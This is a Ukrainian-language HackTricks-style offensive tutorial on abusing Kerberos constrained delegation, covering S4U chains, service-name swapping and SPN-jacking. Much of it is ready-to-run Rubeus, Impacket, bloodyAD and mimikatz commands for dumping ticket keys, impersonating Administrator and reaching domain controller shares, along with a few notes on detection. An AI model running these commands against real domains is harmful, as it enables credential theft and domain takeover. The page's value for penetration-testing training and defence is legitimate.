# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

За допомогою цього адміністратор домену може **дозволити** комп’ютеру **імперсонувати користувача або комп’ютер** під час доступу до будь-якої **служби** на певній машині.

- **Service for User to self (_S4U2self_):** Будь-який **сервісний обліковий запис, якому належить SPN**, зазвичай може отримати TGS до себе від імені довільного користувача. Якщо обліковий запис також має [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) у _userAccountControl_, цей TGS є **переспрямовуваним** (forwardable), що робить перехід протоколу безпосередньо корисним для **класичної constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **Сервісний обліковий запис** може отримати TGS від імені користувача для SPN, перелічених у **msDS-AllowedToDelegateTo**. Квиток-підтвердження, використаний у S4U2Proxy, має бути **переспрямовуваним** квитком до служби, що виконує делегування: або справжнім квитком клієнт—служба, перехопленим у жертви, або квитком, згенерованим за допомогою **S4U2Self + T2A4D**.

**Примітка**: Якщо для користувача в AD позначено параметр «_Account is sensitive and cannot be delegated_» або він входить до групи **Protected Users**, зазвичай ви **не зможете імперсонувати** його через constrained delegation. У сучасних доменах під час роботи з обліковими записами, для яких увімкнено делегування, віддавайте перевагу матеріалу **AES**, а не припущенням, що доступний лише RC4.

Це означає, що якщо ви **скомпрометуєте хеш сервісу**, то зможете **імперсонувати користувачів** і отримати від їхнього імені **доступ** до будь-якої **служби** на зазначених машинах (можливе **підвищення привілеїв**).

Крім того, ви матимете доступ **не лише до служби, яку користувач може імперсонувати, а й до будь-якої іншої служби**, оскільки SPN (запитуване ім’я служби) не перевіряється (ця частина квитка не зашифрована й не підписана). Тому, якщо ви маєте доступ до **служби CIFS**, то також можете отримати доступ до **служби HOST**, наприклад, використавши прапорець `/altservice` у Rubeus. Та сама вразливість із підміною SPN використовується в **Impacket getST -altservice** та інших інструментах.

Також для експлуатації **DCSync** потрібен доступ до **служби LDAP на DC**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Примітка оператору:** не покладайтеся лише на знімки екрана **ADUC** або BloodHound під час перевірки **gMSA/sMSA**. У цих облікових записів часто прихована звична вкладка Delegation, тому перелічуйте безпосередньо raw-атрибути **`userAccountControl`** і **`msDS-AllowedToDelegateTo`**.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Делегування з переходом протоколу vs constrained delegation лише Kerberos

Якщо скомпрометований обліковий запис має **T2A4D**, зазвичай можна виконати повний ланцюжок **`S4U2Self -> S4U2Proxy`**, маючи лише ключ служби/TGT.<sup>[[2]](#references)</sup>

Якщо він має лише **`msDS-AllowedToDelegateTo`** (класичний режим **«Use Kerberos only»**), делегування все ще можна використати, але квиток-доказ для S4U2Proxy має бути **forwardable-квитком від користувача до служби**, призначеним для служби, що делегує. Один зі способів — перехопити TGS жертви з **LSASS/ccache** і передати його на другий етап (`/tgs:` у Rubeus). **Нефорвардований** квиток S4U2Self **не** підійде для класичного constrained delegation; якщо це ваш єдиний квиток-доказ, натомість перевірте [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

Інший умовний шлях — перший перехід [RBCD](resource-based-constrained-delegation.md) до служби, що делегує: якщо він створює **forwardable-квиток** для потрібного користувача й служби, цей квиток можна перевірити як доказ для наступного переходу Kerberos-only S4U2Proxy. Перевірте прапорці першого квитка, SPN служби, що делегує, список дозволених цілей і будь-які обмеження делегування для користувача; сам контроль над атрибутом RBCD не підтверджує можливість другого переходу.

### Примітки щодо constrained delegation між доменами (2025+)

Починаючи з **Windows Server 2012/2012 R2**, KDC підтримує **constrained delegation між доменами/лісами** через розширення S4U2Proxy. У сучасних збірках (Windows Server 2016–2025) ця поведінка зберігається, а для позначення переходу протоколу додаються два PAC SID:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**), коли користувач пройшов звичайну автентифікацію.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**), коли служба підтвердила особу через перехід протоколу.

Якщо між доменами використовується перехід протоколу, очікуйте побачити `SERVICE_ASSERTED_IDENTITY` у PAC — це підтверджує успішне виконання кроку S4U2Proxy.<sup>[[1]](#references)</sup>

### Інструменти Impacket / Linux (altservice і повний S4U)

У нових версіях Impacket (0.11.x+) доступні той самий ланцюжок S4U та заміна SPN, що й у Rubeus:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Якщо ви надаєте перевагу спочатку підробити user ST (наприклад, маючи лише офлайн-хеш), використовуйте **ticketer.py** разом із **getST.py** для S4U2Proxy. **tgssub.py** також стане в пригоді, якщо у вас уже є робочий ccache і потрібно лише замінити клас служби для того самого хоста. Про поточні нюанси дивіться відкриту проблему Impacket #1713 (KRB_AP_ERR_MODIFIED, коли підроблений ST не відповідає ключу SPN).<sup>[[2]](#references)</sup>

### SPN-jacking: перенаправлення цілі constrained delegation

Класична constrained delegation авторизує **рядок SPN** у `msDS-AllowedToDelegateTo`, а не незмінний SID цілі. Під час S4U2Proxy KDC визначає обліковий запис, якому зараз належить цей SPN, і шифрує service ticket довгостроковим ключем цього облікового запису. Тому контроль над обліковим записом, що виконує делегування, разом із `WriteSPN` для іншого облікового запису служби/комп’ютера дає змогу перенаправити незмінену умову делегування без `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Існує два варіанти:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** дозволений SPN не має власника, оскільки його колишній власник був видалений, перейменований або втратив цей SPN. Додайте його безпосередньо до потрібного облікового запису цілі.
- **Live SPN-jacking:** SPN досі належить вихідному обліковому запису. Перевірка дублікатів SPN зазвичай блокує запис для цільового облікового запису, тому потрібен `WriteSPN` для обох об’єктів: видаліть SPN із вихідного облікового запису, додайте його до цільового, отримайте ticket і відновіть початкову реєстрацію.

Наведений нижче узагальнений сценарій для Linux переносить дозволений SPN, виконує S4U від імені скомпрометованого суб’єкта делегування та переписує ім’я служби в ticket на потрібну службу на новій цілі.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` — це другий, окремий примітив. Квиток S4U2Proxy було зашифровано ключем облікового запису, якому тепер належить `$DELEGATED_SPN`; оскільки ім’я служби квитка (`sname`) не входить до зашифрованого тіла квитка, інструменти можуть підставити інший клас служби/ім’я хоста, служба якого використовує той самий ключ облікового запису. SPN-jacking спочатку змінює **ключ облікового запису**, яким захищено квиток, а підстановка класу служби змінює **місце, куди цей квиток пред’являється**.<sup>[[5]](#references)[[6]](#references)</sup>

Для jacking у робочому середовищі виконайте два LDAP-записи у зворотному порядку відразу після отримання квитка, щоб не порушити роботу легітимної служби. На DC, де ввімкнено аудит облікових записів комп’ютерів, шукайте подію Security **4742**, у якій `servicePrincipalName` видаляється з одного комп’ютера й невдовзі додається до іншого; особливу увагу звертайте на випадки, коли ім’я хоста SPN відрізняється від `dNSHostName` призначення. Зіставте це з подією **4769**: S4U2Self вказує той самий обліковий запис як клієнта й службу, тоді як S4U2Proxy заповнює поле **Transited Services**.<sup>[[5]](#references)</sup>

### Налаштування делегування для контрольованого облікового запису

Для цього шляху потрібен **ефективний доступ на запис** до атрибутів делегування облікового запису комп’ютера або служби (наприклад, `GenericAll` або `WriteDACL` із подальшою зміною ACL) **і** право користувача `SeEnableDelegationPrivilege` для облікового запису, який виконує зміну через LDAP. Microsoft вимагає цього права під час зміни `msDS-AllowedToDelegateTo`; самі права контролю над об’єктом не дають змоги обійти цю вимогу. Перш ніж використовувати LDAP-клієнт, наприклад **bloodyAD**, для налаштування делегування з переходом протоколу, перевірте обидві передумови.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Наявний обліковий запис комп’ютера може бути кандидатом, навіть якщо значення `ms-DS-MachineAccountQuota` дорівнює нулю: ця квота обмежує стандартний спосіб створення нового комп’ютера, а не права на наявний об’єкт. Щоб скористатися налаштованим делегуванням, також потрібен контроль над ключем або паролем облікового запису, що виконує делегування, коректне ім’я принципала служби та цільовий користувач, облікові дані якого можна делегувати. Ці умови та ефективний доступ до каталогу потрібно перевіряти окремо.

- Крок 1: **Отримати TGT дозволеної служби**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Є **інші способи отримати TGT ticket** або **RC4** чи **AES256**, не маючи прав SYSTEM на комп’ютері, наприклад Printer Bug і unconstrain delegation, NTLM relaying та зловживання Active Directory Certificate Service
>
> **Маючи лише цей TGT ticket (або хеш), можна виконати цю атаку, не компрометуючи весь комп’ютер.**

- Крок 2: **Отримайте TGS для сервісу, видаючи себе за користувача**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Більше інформації на ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) та [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Огляд Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Зловживання делегуванням за допомогою Impacket (частина 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity знищила домен: огляд наступального використання Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir — SPN-jacking: крайній випадок зловживання WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf — HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
